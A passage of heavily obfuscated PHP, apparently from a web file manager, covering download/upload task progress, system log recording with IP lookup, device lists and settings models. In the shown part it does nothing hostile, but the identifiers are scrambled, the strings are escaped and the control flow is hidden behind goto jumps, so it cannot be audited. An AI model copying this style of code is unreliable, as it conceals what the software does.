$Ø¿¥Üñì[$ÙŞââÊ’[1987]]; $this->update(1); self::log($ÙŞââÊ’[2009] . $ü¬¦¨Á); } public function sourceModelCopy($çŠòæŠ») { $ëÕÁì÷ù =& $_SERVER[‘ÆÜ‘œ]; $ùÊ‚›§¾ = $çŠòæŠ»[0]; $¿‡çÓª = $çŠòæŠ»[1]; $ŒìÏ¾È» =& $this->task; $this->sourceModelCopyFlag = !0; $ŒŠ§ÂÆº = 0; switch ($ùÊ‚›§¾) { case $ëÕÁì÷ù[665]: $ŒŠ§ÂÆº = 1; break; case $ëÕÁì÷ù[668]: $ŒìÏ¾È»[$ëÕÁì÷ù[1981]] = $¿‡çÓª[$ëÕÁì÷ù[32]]; break; case $ëÕÁì÷ù[670]: $ŒŠ§ÂÆº = intval($çŠòæŠ»[$ëÕÁì÷ù[476]] * 0.4); break; case $ëÕÁì÷ù[672]: $ŒŠ§ÂÆº = intval($çŠòæŠ»[$ëÕÁì÷ù[476]] * 0.2); break; case $ëÕÁì÷ù[674]: $ŒŠ§ÂÆº = intval($çŠòæŠ»[$ëÕÁì÷ù[476]] * 0.4); break; } $this->update($ŒŠ§ÂÆº); self::log(array("{$ùÊ‚›§¾}\73\141\144\x64\75{$ŒŠ§ÂÆº}", $çŠòæŠ»)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ÏÅå÷Ë, $ùõ­Æş¥) { $Ç®‰î´¦ =& $_SERVER[‘ÆÜ‘œ]; $this->sourceModelCopyFlag = !0; $¨©Ã£«’ = 1; if (isset($ÏÅå÷Ë[$Ç®‰î´¦[82]])) { $¨©Ã£«’ = $ÏÅå÷Ë[$Ç®‰î´¦[82]][$Ç®‰î´¦[80]]; $¨©Ã£«’ = $¨©Ã£«’ + $ÏÅå÷Ë[$Ç®‰î´¦[82]][$Ç®‰î´¦[81]] + 1; } $this->update($¨©Ã£«’); $this->sourceModelCopyFlag = !1; $this->log(array($Ç®‰î´¦[2010], $¨©Ã£«’, $ÏÅå÷Ë)); } public function sourceMove($– õ…â) { $this->sourceRemove($– õ…â, !1); } public function curlProgress($ëÄŒö¤†, $æù½æÆÈ, $Ö…²ÙÊ, $ÀÕÂµÏ, $å½ÚĞÃÅ) { $ò«äõ×Š =& $_SERVER[‘ÆÜ‘œ]; $ •ìŒ¤  =& $this->task; if ($å½ÚĞÃÅ > 0) { $ •ìŒ¤ [$ò«äõ×Š[1182]] = $ò«äõ×Š[2011]; $ •ìŒ¤ [$ò«äõ×Š[1985]] = $ò«äõ×Š[108]; if ($ •ìŒ¤ [$ò«äõ×Š[1983]]) { $ •ìŒ¤ [$ò«äõ×Š[1984]] = $å½ÚĞÃÅ; } if ($ •ìŒ¤ [$ò«äõ×Š[1986]]) { $ •ìŒ¤ [$ò«äõ×Š[1984]] = $å½ÚĞÃÅ + $ •ìŒ¤ [$ò«äõ×Š[1986]]; } } else { if ($Ö…²ÙÊ > 0) { if ($ •ìŒ¤ [$ò«äõ×Š[1983]] == $æù½æÆÈ) { $ •ìŒ¤ [$ò«äõ×Š[1984]] = $Ö…²ÙÊ; $ •ìŒ¤ [$ò«äõ×Š[1182]] = $ò«äõ×Š[2012]; $ •ìŒ¤ [$ò«äõ×Š[1985]] = $ò«äõ×Š[1333]; } } } $this->update(); $¿ÂÂöúô = "\144\x6f\x77\x6e\x3a{$Ö…²ÙÊ}\x2f{$æù½æÆÈ}\73\x20\x75\x70\x6c\x6f\x61\144\x3a{$å½ÚĞÃÅ}\57{$ÀÕÂµÏ}\x3b\x66\x69\x6c\x65\x3d" . $ •ìŒ¤ [$ò«äõ×Š[1983]]; self::log(array($ò«äõ×Š[2013] . $¿ÂÂöúô . $ò«äõ×Š[74] . $ •ìŒ¤ [$ò«äõ×Š[1981]], curl_getinfo($ëÄŒö¤†))); } public function curlProgressStart($§¥éåğ­) { } public function curlProgressEnd($éîºó¥ğ) { $«ÏôİçÑ =& $_SERVER[‘ÆÜ‘œ]; $Ù‡ç½¼Ï =& $this->task; $‘Õ†ˆò = curl_getinfo($éîºó¥ğ); $ñÈßµ»ù = $‘Õ†ˆò[$«ÏôİçÑ[2014]]; if ($ñÈßµ»ù == -1) { $ñÈßµ»ù = $‘Õ†ˆò[$«ÏôİçÑ[2015]]; } if ($Ù‡ç½¼Ï[$«ÏôİçÑ[1985]] == $«ÏôİçÑ[108] && $ñÈßµ»ù) { $Ù‡ç½¼Ï[$«ÏôİçÑ[1986]] += $ñÈßµ»ù; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $‚¼œÎ›— =& $_SERVER[‘ÆÜ‘œ]; $ËËø÷ƒ¯ =& $this->task; $ËËø÷ƒ¯[$‚¼œÎ›—[2016]] = 1; Hook::bind($‚¼œÎ›—[1975], array($this, $‚¼œÎ›—[2017])); Hook::bind($‚¼œÎ›—[1977], array($this, $‚¼œÎ›—[2018])); Hook::bind($‚¼œÎ›—[1979], array($this, $‚¼œÎ›—[2019])); } protected function endAfter() { $µîÂ µÁ =& $_SERVER[‘ÆÜ‘œ]; Hook::unbind($µîÂ µÁ[1975], array($this, $µîÂ µÁ[2017])); Hook::unbind($µîÂ µÁ[1977], array($this, $µîÂ µÁ[2018])); Hook::unbind($µîÂ µÁ[1979], array($this, $µîÂ µÁ[2019])); } public function progressStart($×Ñ…î) { $¦Æ²ïÎ« =& $_SERVER[‘ÆÜ‘œ]; $İÔúõ¸à = curl_getinfo($×Ñ…î); self::log($¦Æ²ïÎ«[2020] . $İÔúõ¸à[$¦Æ²ïÎ«[392]]); self::valueSet($this->task[$¦Æ²ïÎ«[495]], $this->task); } public function progressEnd($Õ‰öŸ–È) { $”úã„ÄÂ =& $_SERVER[‘ÆÜ‘œ]; self::log($”úã„ÄÂ[2021] . $this->task[$”úã„ÄÂ[495]]); $this->end(); } public function progress($ùóéÈÇ¥, $ùÚ˜ê¶«, $Í¬¦üÙÉ, $ÁÕ‚¤À¬, $ïÚ«¦®ø) { $¥ÔÌé“œ =& $_SERVER[‘ÆÜ‘œ]; $”ßÏš÷‡ =& $this->task; if ($ïÚ«¦®ø > 0) { $”ßÏš÷‡[$¥ÔÌé“œ[1180]] = $”ßÏš÷‡[$¥ÔÌé“œ[1180]] == 0 ? $ÁÕ‚¤À¬ : $”ßÏš÷‡[$¥ÔÌé“œ[1180]]; $”ßÏš÷‡[$¥ÔÌé“œ[1930]] = $ïÚ«¦®ø; } else { if ($Í¬¦üÙÉ > 0) { $”ßÏš÷‡[$¥ÔÌé“œ[1180]] = $”ßÏš÷‡[$¥ÔÌé“œ[1180]] == 0 ? $ùÚ˜ê¶« : $”ßÏš÷‡[$¥ÔÌé“œ[1180]]; $”ßÏš÷‡[$¥ÔÌé“œ[1930]] = $Í¬¦üÙÉ; } } $this->update(); self::log("\x70\162\157\147\162\x65\163\x73\110\x74\x74\160\x3a\x64\157\167\x6e\72{$Í¬¦üÙÉ}\57{$ùÚ˜ê¶«}\73\40\x75\160\x6c\157\x61\144\72{$ïÚ«¦®ø}\x2f{$ÁÕ‚¤À¬}\73"); } } goto D›—Ü¬ÍÚè; EèŸ­“Š¬ˆ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\114\151\x67\150\164\x41\x70\x70"; public $modelType = "\123\171\163\164\x65\x6d\x4f\160\164\x69\x6f\156"; public $field = array("\x6e\141\155\x65", "\x67\162\x6f\165\x70", "\x64\145\x73\x63", "\143\157\x6e\164\x65\x6e\164"); public function listData($­˜Õ”šÊ = false, $ùÒÆÓÇÕ = "\x6d\x6f\144\x69\146\171\x54\151\155\x65", $Âé¨ÙƒÚ = true) { return parent::listData($­˜Õ”šÊ, $ùÒÆÓÇÕ, $Âé¨ÙƒÚ); } public function remove($õ“çÓ­Ó) { $œûğÇû€ = $this->findByName($õ“çÓ­Ó); if (!$œûğÇû€) { return !1; } return parent::remove($œûğÇû€[$_SERVER[‘ÆÜ‘œ][495]]); } public function add($±Îƒòê) { if ($this->findByName($±Îƒòê[$_SERVER[‘ÆÜ‘œ][32]])) { return !1; } return parent::insert($±Îƒòê); } public function update($ÆßŠ•›, $ …£õı) { $¥ºÌÈË =& $_SERVER[‘ÆÜ‘œ]; $ÁÌ¿¸¼¬ = $this->findByName($ÆßŠ•›); $¥³öÎ† = $this->findByName($ …£õı[$¥ºÌÈË[32]]); if (!$ÁÌ¿¸¼¬ || $¥³öÎ† && $¥³öÎ†[$¥ºÌÈË[495]] != $ÁÌ¿¸¼¬[$¥ºÌÈË[495]]) { return !1; } return parent::update($ÁÌ¿¸¼¬[$¥ºÌÈË[495]], $ …£õı); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\x5f\154\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\151\155\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\165\156\x63\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÉÏç‚©œ =& $_SERVER[‘ÆÜ‘œ]; return array($ÉÏç‚©œ[2506] => LNG($ÉÏç‚©œ[2507]), $ÉÏç‚©œ[2508] => LNG($ÉÏç‚©œ[2509]), $ÉÏç‚©œ[2082] => LNG($ÉÏç‚©œ[2510]), $ÉÏç‚©œ[2511] => LNG($ÉÏç‚©œ[2512]), $ÉÏç‚©œ[2513] => LNG($ÉÏç‚©œ[2514]), $ÉÏç‚©œ[2515] => LNG($ÉÏç‚©œ[2516]), $ÉÏç‚©œ[2517] => LNG($ÉÏç‚©œ[2518]), $ÉÏç‚©œ[2110] => LNG($ÉÏç‚©œ[2518]), $ÉÏç‚©œ[2111] => LNG($ÉÏç‚©œ[2519]), $ÉÏç‚©œ[2520] => LNG($ÉÏç‚©œ[2521]), $ÉÏç‚©œ[2522] => LNG($ÉÏç‚©œ[2523]), $ÉÏç‚©œ[2524] => LNG($ÉÏç‚©œ[2525]), $ÉÏç‚©œ[2526] => LNG($ÉÏç‚©œ[2527]), $ÉÏç‚©œ[2108] => LNG($ÉÏç‚©œ[2528]), $ÉÏç‚©œ[2529] => LNG($ÉÏç‚©œ[2530]), $ÉÏç‚©œ[2115] => LNG($ÉÏç‚©œ[2531]), $ÉÏç‚©œ[2532] => LNG($ÉÏç‚©œ[2533]), $ÉÏç‚©œ[2534] => LNG($ÉÏç‚©œ[2535]), $ÉÏç‚©œ[2536] => LNG($ÉÏç‚©œ[2537]), $ÉÏç‚©œ[2538] => LNG($ÉÏç‚©œ[2539]), $ÉÏç‚©œ[2117] => LNG($ÉÏç‚©œ[2540]), $ÉÏç‚©œ[2118] => LNG($ÉÏç‚©œ[2541]), $ÉÏç‚©œ[2542] => LNG($ÉÏç‚©œ[2543]), $ÉÏç‚©œ[2544] => LNG($ÉÏç‚©œ[2545]), $ÉÏç‚©œ[2546] => LNG($ÉÏç‚©œ[2547]), $ÉÏç‚©œ[2113] => LNG($ÉÏç‚©œ[2548]), $ÉÏç‚©œ[2549] => LNG($ÉÏç‚©œ[2550]), $ÉÏç‚©œ[2112] => LNG($ÉÏç‚©œ[2551]), $ÉÏç‚©œ[2552] => LNG($ÉÏç‚©œ[2552]), $ÉÏç‚©œ[2553] => LNG($ÉÏç‚©œ[2554]), $ÉÏç‚©œ[2555] => LNG($ÉÏç‚©œ[2552]), $ÉÏç‚©œ[2556] => LNG($ÉÏç‚©œ[2557]), $ÉÏç‚©œ[2558] => LNG($ÉÏç‚©œ[2559]), $ÉÏç‚©œ[2560] => LNG($ÉÏç‚©œ[2559]), $ÉÏç‚©œ[2561] => LNG($ÉÏç‚©œ[2562]), $ÉÏç‚©œ[2563] => LNG($ÉÏç‚©œ[2563]), $ÉÏç‚©œ[2564] => LNG($ÉÏç‚©œ[2086]), $ÉÏç‚©œ[2565] => LNG($ÉÏç‚©œ[2566]), $ÉÏç‚©œ[2567] => LNG($ÉÏç‚©œ[2568]), $ÉÏç‚©œ[2569] => LNG($ÉÏç‚©œ[2570]), $ÉÏç‚©œ[2571] => LNG($ÉÏç‚©œ[2572]), $ÉÏç‚©œ[2573] => LNG($ÉÏç‚©œ[2574]), $ÉÏç‚©œ[2575] => LNG($ÉÏç‚©œ[2575]), $ÉÏç‚©œ[2576] => LNG($ÉÏç‚©œ[2577]), $ÉÏç‚©œ[2578] => LNG($ÉÏç‚©œ[2579]), $ÉÏç‚©œ[2580] => LNG($ÉÏç‚©œ[2581]), $ÉÏç‚©œ[2582] => LNG($ÉÏç‚©œ[2583]), $ÉÏç‚©œ[2584] => LNG($ÉÏç‚©œ[2585]), $ÉÏç‚©œ[2586] => LNG($ÉÏç‚©œ[2587]), $ÉÏç‚©œ[211] => LNG($ÉÏç‚©œ[211]), $ÉÏç‚©œ[212] => LNG($ÉÏç‚©œ[2588]), $ÉÏç‚©œ[2589] => LNG($ÉÏç‚©œ[2589])); } private function typeFile() { $ìŸûØ =& $_SERVER[‘ÆÜ‘œ]; $ƒîß„‘” = array($ìŸûØ[2115] => array($ìŸûØ[2116]), $ìŸûØ[2524] => array($ìŸûØ[2590]), $ìŸûØ[2526] => array($ìŸûØ[2591]), $ìŸûØ[2108] => array($ìŸûØ[2109], $ìŸûØ[2592]), $ìŸûØ[2534] => array(), $ìŸûØ[2536] => array(), $ìŸûØ[2538] => array(), $ìŸûØ[2117] => array($ìŸûØ[2119]), $ìŸûØ[2118] => array($ìŸûØ[2119]), $ìŸûØ[2542] => array($ìŸûØ[2593]), $ìŸûØ[2544] => array($ìŸûØ[2593]), $ìŸûØ[2546] => array($ìŸûØ[2594]), $ìŸûØ[2532] => array($ìŸûØ[2595]), $ìŸûØ[2113] => array($ìŸûØ[2596]), $ìŸûØ[2549] => array($ìŸûØ[2597]), $ìŸûØ[2112] => array($ìŸûØ[2114])); return $ƒîß„‘”; } private function typeAll() { $ı¹“Ì®ƒ =& $_SERVER[‘ÆÜ‘œ]; $¥È”¶åİ = $this->typeList; $Û¡›ŞÇË = array_filter($this->typeFile()); foreach ($Û¡›ŞÇË as $ˆ»´º­ => $Ã¸¸€ã¿) { $¥È”¶åİ[$Ã¸¸€ã¿[0]] = $¥È”¶åİ[$ˆ»´º­]; } $¥È”¶åİ[$ı¹“Ì®ƒ[2119]] = LNG($ı¹“Ì®ƒ[2598]); $¥È”¶åİ[$ı¹“Ì®ƒ[2593]] = LNG($ı¹“Ì®ƒ[2599]); return $¥È”¶åİ; } public function addLog($ë•ˆÀ¿, $ÇöÛİÑ€ = array()) { $—°™èÌƒ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($this->typeList[$ë•ˆÀ¿])) { return; } $”˜±Ú™ = Session::get($—°™èÌƒ[2273]); if (!$”˜±Ú™) { $”˜±Ú™ = _get($ÇöÛİÑ€, $—°™èÌƒ[1544], 0); } if ($ë•ˆÀ¿ == $—°™èÌƒ[2565] && is_array($ÇöÛİÑ€[$—°™èÌƒ[2600]]) && !$ÇöÛİÑ€[$—°™èÌƒ[2600]]) { return; } $Ô«Êö·‰ = get_client_ip(); if (!$ÇöÛİÑ€ || strlen(json_encode($ÇöÛİÑ€)) >= 1024 * 64) { if ($ÇöÛİÑ€ && is_array($ÇöÛİÑ€)) { $ÇöÛİÑ€ = array_intersect_key($ÇöÛİÑ€, array_flip($—°™èÌƒ[495], $—°™èÌƒ[32])); $ÇöÛİÑ€[$—°™èÌƒ[1560]] = $Ô«Êö·‰; } else { $ÇöÛİÑ€ = array($—°™èÌƒ[1560] => $Ô«Êö·‰); } } else { if (is_array($ÇöÛİÑ€)) { $ÇöÛİÑ€[$—°™èÌƒ[1560]] = $Ô«Êö·‰; } else { $ÇöÛİÑ€ = array($—°™èÌƒ[1341] => $ÇöÛİÑ€, $—°™èÌƒ[1560] => $Ô«Êö·‰); } } $ÇöÛİÑ€[$—°™èÌƒ[2601]] = ACTION; $ÇöÛİÑ€ = array($—°™èÌƒ[1920] => Session::sign(), $—°™èÌƒ[1921] => intval($”˜±Ú™), $—°™èÌƒ[33] => $ë•ˆÀ¿, $—°™èÌƒ[1923] => json_encode($ÇöÛİÑ€)); Hook::trigger($—°™èÌƒ[2602], $ÇöÛİÑ€); return parent::add($ÇöÛİÑ€); } public function remove($°í„÷) { $this->where(array($_SERVER[‘ÆÜ‘œ][516] => $°í„÷))->delete(); } private function _makeOrder($“âºîø = '') { $µÁ§ÔÌ =& $_SERVER[‘ÆÜ‘œ]; $ö˜ğ´†ƒ = $µÁ§ÔÌ[232]; $‡°®Š×¼ = array($µÁ§ÔÌ[545] => $µÁ§ÔÌ[546], $µÁ§ÔÌ[547] => $µÁ§ÔÌ[548]); $Ù®§¤Ì = Input::get($µÁ§ÔÌ[553], $µÁ§ÔÌ[7], $µÁ§ÔÌ[2311], array($µÁ§ÔÌ[2229], $µÁ§ÔÌ[547])); $Ù®§¤Ì = $‡°®Š×¼[$Ù®§¤Ì]; $“âºîø = $“âºîø . "{$ö˜ğ´†ƒ}\x20{$Ù®§¤Ì}"; return $this->order($“âºîø); } public function get($áÄ–…¨‚ = '') { $ô½µ‘É =& $_SERVER[‘ÆÜ‘œ]; if (!$áÄ–…¨‚) { show_json(array()); } $ŸØÄƒĞ› = array(); if ($áÄ–…¨‚[$ô½µ‘É[1544]]) { $ŸØÄƒĞ›[$ô½µ‘É[1544]] = $áÄ–…¨‚[$ô½µ‘É[1544]]; } if (isset($áÄ–…¨‚[$ô½µ‘É[868]])) { $†ËµÊÑ© = $áÄ–…¨‚[$ô½µ‘É[868]]; $Ãòë¥° = isset($áÄ–…¨‚[$ô½µ‘É[869]]) ? $áÄ–…¨‚[$ô½µ‘É[869]] : time(); $ŸØÄƒĞ›[$ô½µ‘É[232]] = array($ô½µ‘É[418], array($†ËµÊÑ©, $Ãòë¥°)); } if ($áÄ–…¨‚[$ô½µ‘É[33]]) { $êƒÖÊº = explode($ô½µ‘É[50], $áÄ–…¨‚[$ô½µ‘É[33]]); $íÒ‰š = $this->typeFile(); $‚êÌ‚ = array(); foreach ($êƒÖÊº as $ù¬À¦¼Ñ) { $‚êÌ‚[] = $ù¬À¦¼Ñ; if (isset($íÒ‰š[$ù¬À¦¼Ñ])) { $‚êÌ‚ = array_merge($‚êÌ‚, $íÒ‰š[$ù¬À¦¼Ñ]); } } $‚êÌ‚ = array_unique($‚êÌ‚); if ($‚êÌ‚) { $ŸØÄƒĞ›[$ô½µ‘É[33]] = array($ô½µ‘É[7], $‚êÌ‚); } } else { $ŸØÄƒĞ›[$ô½µ‘É[33]] = array($ô½µ‘É[2603], $ô½µ‘É[2604]); } if (!empty($áÄ–…¨‚[$ô½µ‘É[1560]])) { $ŸØÄƒĞ›[$ô½µ‘É[548]] = array($ô½µ‘É[482], "\45{$áÄ–…¨‚[$ô½µ‘É[1560]]}\45"); } $ĞáÇÏŞí = $this->_makeOrder()->where($ŸØÄƒĞ›)->selectPage(); if (empty($ĞáÇÏŞí[$ô½µ‘É[455]])) { show_json(array(), !0, $ĞáÇÏŞí[$ô½µ‘É[452]]); } $ĞáÇÏŞí[$ô½µ‘É[455]] = $this->logList($ĞáÇÏŞí[$ô½µ‘É[455]]); return $ĞáÇÏŞí; } private function ipAddress(&$¯£âøÑ) { $Ä°æÔ£ß =& $_SERVER[‘ÆÜ‘œ]; if (!empty($¯£âøÑ[$Ä°æÔ£ß[1560]])) { $²…¨äß© = IpLocation::get($¯£âøÑ[$Ä°æÔ£ß[1560]]); } else { $²…¨äß© = LNG($Ä°æÔ£ß[2605]); } $¯£âøÑ[$Ä°æÔ£ß[2606]] = $²…¨äß©; } private function descZipDownload($³·¾³Ïê, &$ÊÀšéüä) { $‡‘Å†õ‡ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($³·¾³Ïê[$‡‘Å†õ‡[1567]])) { return; } $Ñ¶âŞ®Ë = json_decode($³·¾³Ïê[$‡‘Å†õ‡[1567]], !0); foreach ($Ñ¶âŞ®Ë as $‚®‡»ò‡) { try { $â­„µË = IO::infoFullSimple($‚®‡»ò‡[$‡‘Å†õ‡[87]]); } catch (Exception $âÆÇˆü·) { continue; } $³·¾³Ïê[$‡‘Å†õ‡[87]] = $‚®‡»ò‡[$‡‘Å†õ‡[87]]; $ÊÀšéüä[] = $³·¾³Ïê[$‡‘Å†õ‡[192]] = $â­„µË[$‡‘Å†õ‡[192]]; $ÊÀšéüä[] = $³·¾³Ïê[$‡‘Å†õ‡[2371]] = $â­„µË[$‡‘Å†õ‡[191]]; break; } return $³·¾³Ïê; } private function getSourceList(&$³·Ü°¬È) { $½îúş˜İ =& $_SERVER[‘ÆÜ‘œ]; $üô«½Á÷ = array(); foreach ($³·Ü°¬È as $€¡¼ŒÁ => $²¿©µµ) { $¦œÉÍ¤Ê = json_decode($²¿©µµ[$½îúş˜İ[548]], !0); if ($²¿©µµ[$½îúş˜İ[33]] == $½îúş˜İ[2111]) { $¦œÉÍ¤Ê = $this->descZipDownload($¦œÉÍ¤Ê, $üô«½Á÷); $³·Ü°¬È[$€¡¼ŒÁ][$½îúş˜İ[548]] = json_encode($¦œÉÍ¤Ê); continue; } if (strpos($²¿©µµ[$½îúş˜İ[33]], $½îúş˜İ[2373]) !== 0) { if (!isset($¦œÉÍ¤Ê[$½îúş˜İ[87]]) || strpos($²¿©µµ[$½îúş˜İ[33]], $½îúş˜İ[2607]) !== 0) { continue; } try { $´¢Ó•»¤ = IO::infoFullSimple($¦œÉÍ¤Ê[$½îúş˜İ[87]]); } catch (Exception $ı“é¬Á) { continue; } $üô«½Á÷[] = $¦œÉÍ¤Ê[$½îúş˜İ[192]] = $´¢Ó•»¤[$½îúş˜İ[192]]; $üô«½Á÷[] = $¦œÉÍ¤Ê[$½îúş˜İ[2371]] = $´¢Ó•»¤[$½îúş˜İ[191]]; $³·Ü°¬È[$€¡¼ŒÁ][$½îúş˜İ[548]] = json_encode($¦œÉÍ¤Ê); continue; } $üô«½Á÷[] = $¦œÉÍ¤Ê[$½îúş˜İ[192]]; $üô«½Á÷[] = $¦œÉÍ¤Ê[$½îúş˜İ[2371]]; if ($¦œÉÍ¤Ê[$½îúş˜İ[33]] == $½îúş˜İ[651]) { $üô«½Á÷[] = $¦œÉÍ¤Ê[$½îúş˜İ[548]][$½îúş˜İ[1294]]; $üô«½Á÷[] = $¦œÉÍ¤Ê[$½îúş˜İ[548]][$½îúş˜İ[1295]]; } if ($¦œÉÍ¤Ê[$½îúş˜İ[33]] == $½îúş˜İ[2381]) { $üô«½Á÷[] = $¦œÉÍ¤Ê[$½îúş˜İ[548]][$½îúş˜İ[192]]; } } if (!$üô«½Á÷) { return array(); } return Model($½îúş˜İ[939])->sourceListInfo($üô«½Á÷, !0); } private function logList($üÑˆšö) { $èÜ‹â±ç =& $_SERVER[‘ÆÜ‘œ]; $õ¡Û½ñê = array_to_keyvalue($üÑˆšö, $èÜ‹â±ç[12], $èÜ‹â±ç[1544]); $íë”Á³ = Model($èÜ‹â±ç[625])->userListInfo(array_unique($õ¡Û½ñê)); $æâ¥”ÄÜ = $this->getSourceList($üÑˆšö); $ßşëŞ°µ = $this->typeAll(); $Ë— Ú»× = array(); $—Ï˜Åƒ = array(); foreach ($üÑˆšö as $¥´Ã…Ö– => $š“‰¥·ã) { $“„¦–¾Õ = $š“‰¥·ã[$èÜ‹â±ç[33]]; $·´Ãëí¿ = isset($íë”Á³[$š“‰¥·ã[$èÜ‹â±ç[1544]]]) ? $íë”Á³[$š“‰¥·ã[$èÜ‹â±ç[1544]]] : !1; $öµ–ô–± = strpos($“„¦–¾Õ, $èÜ‹â±ç[2608]) === 0 ? LNG($èÜ‹â±ç[2609]) : LNG($èÜ‹â±ç[2605]); $š“‰¥·ã[$èÜ‹â±ç[32]] = isset($·´Ãëí¿[$èÜ‹â±ç[32]]) ? $·´Ãëí¿[$èÜ‹â±ç[32]] : LNG($èÜ‹â±ç[2605]); $š“‰¥·ã[$èÜ‹â±ç[2431]] = isset($·´Ãëí¿[$èÜ‹â±ç[2431]]) ? $·´Ãëí¿[$èÜ‹â±ç[2431]] : $èÜ‹â±ç[12]; $š“‰¥·ã[$èÜ‹â±ç[1818]] = isset($ßşëŞ°µ[$“„¦–¾Õ]) ? $ßşëŞ°µ[$“„¦–¾Õ] : $öµ–ô–±; $š“‰¥·ã[$èÜ‹â±ç[2310]] = $·´Ãëí¿; $ËÉÀó³ı = json_decode($š“‰¥·ã[$èÜ‹â±ç[548]], !0); $š“‰¥·ã[$èÜ‹â±ç[1560]] = isset($ËÉÀó³ı[$èÜ‹â±ç[1560]]) ? $ËÉÀó³ı[$èÜ‹â±ç[1560]] : $èÜ‹â±ç[12]; $š“‰¥·ã[$èÜ‹â±ç[2606]] = IpLocation::get($š“‰¥·ã[$èÜ‹â±ç[1560]]); if (strpos($“„¦–¾Õ, $èÜ‹â±ç[2373]) === 0 || isset($ËÉÀó³ı[$èÜ‹â±ç[2371]])) { $ËÉÀó³ı[$èÜ‹â±ç[90]] = $æâ¥”ÄÜ[$ËÉÀó³ı[$èÜ‹â±ç[192]]]; $ËÉÀó³ı[$èÜ‹â±ç[2386]] = $æâ¥”ÄÜ[$ËÉÀó³ı[$èÜ‹â±ç[2371]]]; if ($ËÉÀó³ı[$èÜ‹â±ç[33]] == $èÜ‹â±ç[651]) { $ËÉÀó³ı[$èÜ‹â±ç[548]][$èÜ‹â±ç[1294]] = $æâ¥”ÄÜ[$ËÉÀó³ı[$èÜ‹â±ç[548]][$èÜ‹â±ç[1294]]]; $ËÉÀó³ı[$èÜ‹â±ç[548]][$èÜ‹â±ç[1295]] = $æâ¥”ÄÜ[$ËÉÀó³ı[$èÜ‹â±ç[548]][$èÜ‹â±ç[1295]]]; } if ($ËÉÀó³ı[$èÜ‹â±ç[33]] == $èÜ‹â±ç[2381]) { $ËÉÀó³ı[$èÜ‹â±ç[548]][$èÜ‹â±ç[192]] = $æâ¥”ÄÜ[$ËÉÀó³ı[$èÜ‹â±ç[548]][$èÜ‹â±ç[192]]]; } if ($ËÉÀó³ı[$èÜ‹â±ç[33]] == $èÜ‹â±ç[1282]) { $ËÉÀó³ı[$èÜ‹â±ç[2386]] = $ËÉÀó³ı[$èÜ‹â±ç[90]]; $ËÉÀó³ı[$èÜ‹â±ç[2371]] = $ËÉÀó³ı[$èÜ‹â±ç[2386]][$èÜ‹â±ç[192]]; $ËÉÀó³ı[$èÜ‹â±ç[90]] = !1; $ËÉÀó³ı[$èÜ‹â±ç[192]] = $èÜ‹â±ç[12]; } $’µ­Â = array($èÜ‹â±ç[1282], $èÜ‹â±ç[2369]); if (!in_array($ËÉÀó³ı[$èÜ‹â±ç[33]], $’µ­Â)) { if ($ËÉÀó³ı[$èÜ‹â±ç[90]] && $ËÉÀó³ı[$èÜ‹â±ç[90]][$èÜ‹â±ç[189]] == $èÜ‹â±ç[190]) { $—Ï˜Åƒ[] = $š“‰¥·ã[$èÜ‹â±ç[495]]; unset($üÑˆšö[$¥´Ã…Ö–]); continue; } if ($ËÉÀó³ı[$èÜ‹â±ç[2386]] && $ËÉÀó³ı[$èÜ‹â±ç[2386]][$èÜ‹â±ç[189]] == $èÜ‹â±ç[190]) { $—Ï˜Åƒ[] = $š“‰¥·ã[$èÜ‹â±ç[495]]; unset($üÑˆšö[$¥´Ã…Ö–]); continue; } } } $š“‰¥·ã[$èÜ‹â±ç[548]] = $ËÉÀó³ı; unset($š“‰¥·ã[$èÜ‹â±ç[2610]]); $Ë— Ú»×[] = $š“‰¥·ã; } $this->clearSystemPathLog($—Ï˜Åƒ); return $Ë— Ú»×; } private function clearSystemPathLog($ù…î— ) { $ëüšÎÚ± =& $_SERVER[‘ÆÜ‘œ]; if (count($ù…î— ) == 0) { return; } $öêê‚®Æ = array($ëüšÎÚ±[495] => array($ëüšÎÚ±[7], array_unique($ù…î— ))); $this->where($öêê‚®Æ)->delete(); } public function deviceList($ßé–À‰’, $å±ÃÀ”¾ = 0) { $ó†›êş =& $_SERVER[‘ÆÜ‘œ]; $ã¨ş¡¼¬ = array($ó†›êş[1544] => $ßé–À‰’, $ó†›êş[232] => array($ó†›êş[1132], $å±ÃÀ”¾), $ó†›êş[33] => $ó†›êş[2082]); $¿¯çáñÎ = array(); $˜™®Ş­å = $this->field($ó†›êş[2611])->where($ã¨ş¡¼¬)->order($ó†›êş[2384])->limit(50)->select(); foreach ($˜™®Ş­å as $Ìõé‘ëŸ => $•ûà‡’Ó) { if ($Ìõé‘ëŸ > 0 && abs($•ûà‡’Ó[$ó†›êş[232]] - $˜™®Ş­å[$Ìõé‘ëŸ - 1][$ó†›êş[232]]) < 5) { continue; } $ÍñïËÕ¤ = json_decode($•ûà‡’Ó[$ó†›êş[548]], !0); $•ûà‡’Ó[$ó†›êş[1560]] = isset($ÍñïËÕ¤[$ó†›êş[1560]]) ? $ÍñïËÕ¤[$ó†›êş[1560]] : $ó†›êş[12]; unset($ÍñïËÕ¤[$ó†›êş[1560]]); $Ö£úí ï = $this->deviceType($ÍñïËÕ¤[$ó†›êş[2374]]); if (isset($¿¯çáñÎ[$Ö£úí ï])) { continue; } $•ûà‡’Ó[$ó†›êş[2606]] = IpLocation::get($•ûà‡’Ó[$ó†›êş[1560]]); $•ûà‡’Ó[$ó†›êş[548]] = $ÍñïËÕ¤; $¿¯çáñÎ[$Ö£úí ï] = $•ûà‡’Ó; } return array_values($¿¯çáñÎ); } public function deviceType($Õúñ¤û£) { return $Õúñ¤û£; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\156\x6f\164\151\x63\145\114\x69\163\x74"; public $field = array("\156\x61\155\145", "\x63\157\x6e\164\x65\x6e\164", "\141\x75\x74\150", "\x6d\x6f\x64\145", "\164\151\155\x65", "\164\171\160\145", "\x6c\x65\x76\145\x6c", 